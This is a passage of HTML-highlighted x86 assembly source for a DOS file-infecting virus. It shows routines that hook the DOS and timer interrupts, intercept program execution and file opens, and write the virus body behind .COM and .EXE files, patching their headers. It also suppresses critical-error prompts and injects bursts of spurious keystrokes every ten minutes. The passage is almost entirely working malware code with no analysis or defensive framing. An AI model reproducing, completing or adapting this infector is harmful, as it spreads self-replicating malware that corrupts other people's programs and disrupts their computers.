              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc5">VirSize</span><span class="sc4">]</span><span class="sc0">                                  </span><span class="sc1">; CX = virussize</span><span class="sc0">
              </span><span class="sc6">cld</span><span class="sc0">
              </span><span class="sc6">repz</span><span class="sc0">                                 </span><span class="sc1">; Copy virus to virus-segment</span><span class="sc0">
              </span><span class="sc6">movsb</span><span class="sc0">
              </span><span class="sc6">clc</span><span class="sc0">                                    </span><span class="sc1">; No error, virus installed</span><span class="sc0">
              </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;*** Install new interrupts (1C - Timer Tick, 21 - DOS) ***</span><span class="sc0">

</span><span class="sc5">Inst_Ints</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
              </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Ticks</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">351Ch</span><span class="sc0">                                 </span><span class="sc1">; Get Addr Timer Tick</span><span class="sc0">
              </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">I1c_ofs</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">I1c_seg</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3521h</span><span class="sc0">                                    </span><span class="sc1">; Get Addr DOS-Int</span><span class="sc0">
              </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">I21_ofs</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">I21_seg</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">251Ch</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">New_I1c</span><span class="sc0">
              </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                               </span><span class="sc1">; Install New Timer-Tick Int</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">I21_dos12</span><span class="sc0">
              </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc0">                                       </span><span class="sc1">; Get DOS-Version</span><span class="sc0">
              </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
              </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
              </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                                              </span><span class="sc1">; Below 3.0?</span><span class="sc0">
              </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">DosBel3</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">new_I21</span><span class="sc0">                                </span><span class="sc1">; No, new int</span><span class="sc0">
</span><span class="sc5">DosBel3</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2521h</span><span class="sc0">                                 </span><span class="sc1">; Install new DOS-Int</span><span class="sc0">
              </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
              </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
              </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
              </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;*** Proc: NEW 1C (TIMER TICK) INTERRUPT ***</span><span class="sc0">
</span><span class="sc1">; Every 10 minutes this routine sends during 2 sec. 180 extra keys to the</span><span class="sc0">
</span><span class="sc1">; keyboard-interrupt.</span><span class="sc0">

</span><span class="sc5">Ticks</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">New_I1c</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Ticks</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Increment 'Ticks after virus loaded'</span><span class="sc0">
              </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Ticks</span><span class="sc4">],</span><span class="sc2">2A30h</span><span class="sc0">                 </span><span class="sc1">; 10 minutes passed?</span><span class="sc0">
              </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">org_I1c</span><span class="sc0">                                   </span><span class="sc1">; No, go to orig. I1c</span><span class="sc0">
              </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Ticks</span><span class="sc4">],</span><span class="sc2">2A54h</span><span class="sc0">                     </span><span class="sc1">; 2 sec. passed?</span><span class="sc0">
              </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">screw_keys</span><span class="sc0">                                </span><span class="sc1">; Not yet, give ESCs</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Ticks</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">; Time-counter to 0</span><span class="sc0">
              </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Org_I1c</span><span class="sc0">                                </span><span class="sc1">; Go to orig. I1c</span><span class="sc0">
</span><span class="sc5">Screw_Keys</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">                                          </span><span class="sc1">; 5 times / tick</span><span class="sc0">
</span><span class="sc5">Put_Key</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">                                             </span><span class="sc1">; Give extra key</span><span class="sc0">
              </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">Put_key</span><span class="sc0">
              </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">Org_I1c</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EAh</span><span class="sc0">                                    </span><span class="sc1">; Jump far to orig. I1c</span><span class="sc0">
</span><span class="sc5">I1c_Ofs</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">I1c_Seg</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">New_I24</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">New_I23</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">I23_Ofs</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">I23_Seg</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">I24_Ofs</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">I24_Seg</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">ProgSize</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">                                </span><span class="sc1">; Program size in paragraphs</span><span class="sc0">

</span><span class="sc5">New_I21</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4B00h</span><span class="sc0">                             </span><span class="sc1">; New DOS Int for DOS 3 +</span><span class="sc0">
              </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Is_Start</span><span class="sc0">
              </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">far</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">I21_Ofs</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">; Jmp orig. I 21</span><span class="sc0">
</span><span class="sc5">Is_Start</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Save_Regs</span><span class="sc0">
              </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InstCritInt</span><span class="sc0">               </span><span class="sc1">; Install new ^c and crit. err. int</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D02h</span><span class="sc0">                        </span><span class="sc1">; Open file for read and write</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc5">R_Ds</span><span class="sc0">
              </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
              </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
              </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
              </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">Close_File</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
              </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Read_header</span><span class="sc0">
              </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">Close_File</span><span class="sc0">
              </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Write_virus</span><span class="sc0">
              </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">Close_File</span><span class="sc0">
              </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Write_header</span><span class="sc0">
</span><span class="sc5">Close_File</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">                                            </span><span class="sc1">; Close file</span><span class="sc0">
              </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
              </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RestCritInt</span><span class="sc0">                    </span><span class="sc1">; Restore ^c and crit-err ints</span><span class="sc0">
              </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Rst_regs_int</span><span class="sc0">
              </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">far</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">I21_Ofs</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">I21_Dos12</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Dh</span><span class="sc0">                       </span><span class="sc1">; New DOS-Int for DOS 1.x and 2.x</span><span class="sc0">
              </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Is_Open</span><span class="sc0">

</span><span class="sc5">JmpDos</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EAh</span><span class="sc0">                                                 </span><span class="sc1">; Jump Far</span><span class="sc0">
</span><span class="sc5">I21_Ofs</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">I21_Seg</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">Is_Open</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                                           </span><span class="sc1">; Network-flags?</span><span class="sc0">
              </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0FCh</span><span class="sc0">
              </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
              </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">JmpDos</span><span class="sc0">                                            </span><span class="sc1">; Yes -&gt; DOS</span><span class="sc0">

              </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Save_Regs</span><span class="sc0">

              </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InstCritInt</span><span class="sc0">               </span><span class="sc1">; Install new ^c and crit. err. int</span><span class="sc0">

              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc5">R_Ds</span><span class="sc0">
              </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                                             </span><span class="sc1">; Write access</span><span class="sc0">
              </span><span class="sc6">pushf</span><span class="sc0">
              </span><span class="sc6">cli</span><span class="sc0">
              </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">far</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">I21_Ofs</span><span class="sc4">]</span><span class="sc0">                                  </span><span class="sc1">; Open file</span><span class="sc0">
              </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
              </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
              </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">Open_Error</span><span class="sc0">                               </span><span class="sc1">; Error opening -&gt; DOS</span><span class="sc0">

              </span><span class="sc6">pushf</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">R_Ax</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">                                        </span><span class="sc1">; Save handle</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

              </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Chk_Inf</span><span class="sc0">                         </span><span class="sc1">; Check infection is possible</span><span class="sc0">
              </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">No_Infect</span><span class="sc0">                                          </span><span class="sc1">; No -&gt; quit</span><span class="sc0">

              </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Read_header</span><span class="sc0">
              </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">No_Infect</span><span class="sc0">

              </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Write_virus</span><span class="sc0">
              </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">No_Infect</span><span class="sc0">
              </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Write_header</span><span class="sc0">
</span><span class="sc5">No_Infect</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Go_file_beg</span><span class="sc0">                             </span><span class="sc1">; Go to begin of file</span><span class="sc0">
              </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RestCritInt</span><span class="sc0">                    </span><span class="sc1">; Restore ^c and crit-err ints</span><span class="sc0">
              </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Rst_regs_int</span><span class="sc0">
              </span><span class="sc6">popf</span><span class="sc0">
              </span><span class="sc6">retf</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">Open_Error</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RestCritInt</span><span class="sc0">                    </span><span class="sc1">; Restore ^c and crit-err ints</span><span class="sc0">
              </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Rst_regs_int</span><span class="sc0">
              </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">JmpDos</span><span class="sc0">


</span><span class="sc1">;*** Proc: Buffer for header of program to infect ***</span><span class="sc0">

</span><span class="sc5">Head_buf</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0Ch</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">


</span><span class="sc1">;*** Proc: Install new ^C and crit. err. interrupt ***</span><span class="sc0">

</span><span class="sc5">InstCritInt</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
              </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
              </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
              </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
              </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
              </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
              </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3523h</span><span class="sc0">                             </span><span class="sc1">; Get Ctrl-Break Int Addr</span><span class="sc0">
              </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">I23_Ofs</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">I23_Seg</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3524h</span><span class="sc0">                              </span><span class="sc1">; Get Crit. Err Int Addr</span><span class="sc0">
              </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">I24_Ofs</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">I24_Seg</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2523h</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">New_I23</span><span class="sc0">                 </span><span class="sc1">; Install new Ctrl-Break Int</span><span class="sc0">
              </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">                           </span><span class="sc1">; Install new Crit. Err Int</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">New_I24</span><span class="sc0">
              </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
              </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
              </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
              </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
              </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
              </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
              </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;*** Proc: Restore orig. ctrl-break and crit. err. interrupt ***</span><span class="sc0">

</span><span class="sc5">RestCritInt</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">                           </span><span class="sc1">; Rest. orig. crit. err int</span><span class="sc0">
              </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">I24_Ofs</span><span class="sc4">]</span><span class="sc0">
              </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2523h</span><span class="sc0">                          </span><span class="sc1">; Rest. orig. ctrl-break int</span><span class="sc0">
              </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">I23_Ofs</span><span class="sc4">]</span><span class="sc0">
              </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
              </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
              </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
              </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;*** Read header of file ***</span><span class="sc0">

</span><span class="sc5">Read_header</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Head_buf</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">
              </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
              </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">HeadRead_Err</span><span class="sc0">                      </span><span class="sc1">; Error reading, don't infect</span><span class="sc0">

              </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Check_infect</span><span class="sc0"> </span><span class="sc1">; Check file already infected; if not, save data</span><span class="sc0">
              </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">HeadRead_Err</span><span class="sc0">                                      </span><span class="sc1">; Error, quit</span><span class="sc0">

              </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Calc_data</span><span class="sc0">                  </span><span class="sc1">; Calculate data for infected file</span><span class="sc0">
              </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">HeadRead_Err</span><span class="sc0">                                      </span><span class="sc1">; Error, quit</span><span class="sc0">

</span><span class="sc5">HeadRead_Err</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;*** Proc: Write virus, and for .COM files, write first 16 bytes behind virus ***</span><span class="sc0">

</span><span class="sc5">Write_virus</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                            </span><span class="sc1">; Write virus behind program</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc5">VirSize</span><span class="sc4">]</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
              </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
              </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">Err_Writ</span><span class="sc0">                                    </span><span class="sc1">; Write error, quit</span><span class="sc0">
              </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
              </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Err_Writ</span><span class="sc0">                                   </span><span class="sc1">; '   ' '   '  '  '</span><span class="sc0">
              </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Com_or_exe</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
              </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">First_Write</span><span class="sc0">
              </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">First_Write</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                 </span><span class="sc1">; Write orig. 1st 16 bytes behind virus</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Head_buf</span><span class="sc0">
              </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
              </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">Err_Writ</span><span class="sc0">                                    </span><span class="sc1">; Write error, quit</span><span class="sc0">
              </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
              </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Err_Writ</span><span class="sc0">                                   </span><span class="sc1">; '   ' '   '  '  '</span><span class="sc0">
              </span><span class="sc6">clc</span><span class="sc0">                                      </span><span class="sc1">; End procedure, no error</span><span class="sc0">
              </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Err_Writ</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">stc</span><span class="sc0">                                         </span><span class="sc1">; End procedure, error</span><span class="sc0">
              </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;*** Proc: .COM: Write jump-to-virus, .EXE: Write header ***</span><span class="sc0">

</span><span class="sc5">Write_header</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Go_file_beg</span><span class="sc0">                             </span><span class="sc1">; Go to begin of file</span><span class="sc0">
              </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Com_or_exe</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">                          </span><span class="sc1">; .EXE-file?</span><span class="sc0">
              </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Exe_header</span><span class="sc0">
